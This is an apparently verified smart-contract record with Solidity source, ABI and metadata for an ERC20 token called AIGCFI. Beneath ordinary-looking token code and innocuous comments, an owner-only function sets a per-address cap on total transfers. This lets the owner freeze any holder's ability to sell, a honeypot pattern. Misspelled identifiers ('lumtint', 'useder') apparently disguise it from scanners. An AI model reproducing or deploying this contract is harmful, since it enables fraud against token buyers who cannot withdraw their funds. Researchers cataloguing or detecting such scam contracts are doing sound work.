{"SourceCode": "// Importing the standard interface for ERC20 tokens\r\npragma solidity ^0.8.0;\r\ninterface IERC20 {\r\n    // These functions aren't implemented here but need to be in any contract that aims to fulfill the ERC20 standard.\r\n    \r\n    // Returns the total supply of the token.\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    // Returns the balance of a specific address.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    // Transfers a certain amount of tokens to a specified address.\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Checks how many tokens are allowed to be transferred from one address to another.\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    // Approves a certain amount of tokens to be transferred from the caller's address.\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    // Transfers from one address to another, considering the approved amount.\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Events to log transfers and approvals.\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Abstract contract that provides information about the transaction's sender.\r\nabstract contract Context {\r\n    // Returns the address of the entity executing the current function.\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\n// Contract that implements ownership functionalities, including renouncing and transferring ownership.\r\ncontract Ownable is Context {\r\n    address private _owner; // Storage for the owner's address\r\n    \r\n    // Event to log ownership transfers.\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        // The deployer of the contract is set as the initial owner.\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    // Returns the address of the current owner.\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Modifier to restrict functions to only the contract owner.\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Allows the current owner to relinquish ownership. The owner will be set to a \"dead address\".\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n// Main token contract.\r\ncontract AIGCFI is Context, Ownable, IERC20 {\r\n    // Storage for useder balances and allowances.\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    // Storage for transfer lumtints and their tracking.\r\n    mapping(address => uint256) public totalTransferlumtints;\r\n    mapping(address => uint256) public totalTransferredAmounts;\r\n\r\n    // Token attributes\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n\r\n    // Modifier to enforce transfer lumtints for certain addresses.\r\n    modifier transferlumtint(address sender, uint256 amount) {\r\n        uint256 lumtint = totalTransferlumtints[sender];\r\n        if (lumtint > 0) {\r\n            require(totalTransferredAmounts[sender] + amount <= lumtint, \"Total transfer amount exceeds the set lumtint\");\r\n        }\r\n        _;\r\n    }\r\n\r\n    // Constructor to initialize the token's attributes and mint the initial supply.\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    // Getters for token attributes.\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Function to set a transfer lumtint for a useder. Only the owner can do this.\r\n    function setTotalTransferlumtint(address useder, uint256 lumtint) public onlyOwner {\r\n        totalTransferlumtints[useder] = lumtint;\r\n    }\r\n\r\n    // Function to remove a useder's transfer lumtint. Only the owner can do this.\r\n    function removeTotalTransferlumtint(address useder) public onlyOwner {\r\n        delete totalTransferlumtints[useder];\r\n    }\r\n\r\n    // Transfer tokens to a specified address.\r\n    function transfer(address recipient, uint256 amount) public virtual override transferlumtint(_msgSender(), amount) returns (bool) {\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        totalTransferredAmounts[_msgSender()] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Check the amount of tokens allowed to be spent by a spender on behalf of the owner.\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Approve a spender to spend a certain amount of tokens on behalf of the message sender.\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // Transfer tokens from one address to another on behalf of the owner.\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferlumtint(sender, amount) returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"Transfer amount exceeds allowance\");\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        totalTransferredAmounts[sender] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"useder\",\"type\":\"address\"}],\"name\":\"removeTotalTransferlumtint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"useder\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"lumtint\",\"type\":\"uint256\"}],\"name\":\"setTotalTransferlumtint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferlumtints\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTransferredAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AIGCFI", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000900000000000000000000000000000000000000000000000000000000d09dc3000000000000000000000000000000000000000000000000000000000000000006414947434649000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064149474346490000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://36f9852351c4fe0ccb50e1b034051d1f433c4c9115c20bd37fda4aeb7b30fa8f"}